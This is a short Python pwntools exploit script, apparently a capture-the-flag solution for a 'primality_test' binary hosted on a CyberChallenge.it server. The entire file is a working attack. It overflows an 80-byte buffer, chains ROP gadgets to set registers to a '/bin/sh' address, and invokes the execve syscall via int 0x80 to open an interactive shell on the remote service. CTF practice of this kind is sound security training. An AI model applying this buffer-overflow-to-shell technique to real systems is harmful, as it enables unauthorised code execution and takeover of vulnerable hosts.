#!/usr/bin/env python3

from pwn import *

exe = ELF("./primality_test")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rop.challs.cyberchallenge.it", 9130)

    return r


def main():
    r = conn()
    #print(r.pid)

    # good luck pwning :)

    
    ret_addr_ebx_ecx = p32(0x08048609) # pop ebx; pop ecx; ret; 
    ret_addr_edx = p32(0x0804860c)     # pop edx; ret;
    ret_addr_eax = p32(0x08048606)     # pop eax; int 0x80;

    shell_string_addr = p32(0x08048991, endianness = 'little') # -> "/bin/sh"

    tmp = 11
    syscall_id = tmp.to_bytes(4, 'little')
    tmp2 = 0
    zero = p32(0, endianness = 'little')

    # test 
    payload = b'a'*80 + ret_addr_ebx_ecx + shell_string_addr + zero + ret_addr_eax + syscall_id

    print(payload)
    data = r.recvline()
    print(data)
    data = r.recvuntil("Enter a number: ")
    print(data)
    #input()

    r.sendline(payload)

    data = r.recvline()
    print(data)

    r.interactive()


if __name__ == "__main__":
    main()
